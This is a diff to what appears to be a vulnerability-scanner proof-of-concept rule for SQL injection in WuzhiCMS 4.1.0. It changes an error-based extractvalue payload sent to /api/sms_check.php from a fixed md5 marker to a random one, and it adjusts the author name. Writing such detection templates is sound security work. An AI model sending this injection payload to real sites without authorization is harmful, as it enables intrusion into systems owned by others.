@@ -1,11 +1,13 @@
 name: poc-yaml-wuzhicms-sqli
+set:
+  rand: randomInt(200000000, 210000000)
 rules:
   - method: GET
-    path: /api/sms_check.php?param=1'and extractvalue(1,concat(0x7e,md5(123)))%23
+    path: /api/sms_check.php?param=1'and extractvalue(1,concat(0x7e,md5({{rand}})))%23
     expression: |
-      response.body.bcontains(b"202cb962ac59075b964b07152d234b7")
+      response.body.bcontains(bytes(md5(string(rand))))
 detail:
-  author: rexus
+  author: Rexus
   Affected Version: "4.1.0"
   links:
     - https://blog.csdn.net/qq_23936389/article/details/84967439
